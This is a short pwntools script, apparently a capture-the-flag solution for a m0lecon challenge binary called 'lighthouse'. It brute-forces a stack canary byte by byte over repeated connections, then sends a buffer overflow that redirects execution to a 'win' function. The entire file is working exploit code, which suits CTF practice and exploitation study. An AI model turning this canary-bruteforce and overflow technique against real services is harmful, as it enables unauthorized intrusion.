#!/usr/bin/env python3

from pwn import *

HOST,PORT = ('127.0.0.1',9001) if args.LOCAL else ('offsec.m0lecon.it',13582)
elf = context.binary = ELF('./lighthouse',checksec = False)

def main():
    p = remote(HOST,PORT)
    OFFSET_CANARY = 136
    ret_addr = 0x000000000040101a

    known = b'\x00'
    for i in range(7):
        for b in range(256):
            guess = known + bytes([b])
            payload = b'A'*OFFSET_CANARY + guess
            p = remote(HOST,PORT, level = "error")
            p.recvuntil(b'> ')
            p.sendline(b'1')
            p.recvuntil(b'entry: \n')
            p.send(payload)
            try:
                data = p.recv(timeout = 0.2)
            except EOFError:
                data = b''
            p.close()

            if b'out.' in data:
                known = guess
                log.info(f"Byte found: {b:02x}")
                break
    
    canary = u64(known)
    log.info(f"Canary found: {canary:x}")

    #exploit the canary leak
    p2 = remote(HOST,PORT)
    attack = b'A' * OFFSET_CANARY + p64(canary) + b'B'*8 + p64(ret_addr) + p64(elf.sym.win)
    p2.recvuntil(b'> ')
    p2.sendline(b'1')
    p2.recvuntil(b'entry: \n')
    p2.send(attack)
    p2.interactive()
    

if __name__ == "__main__":
    main()
            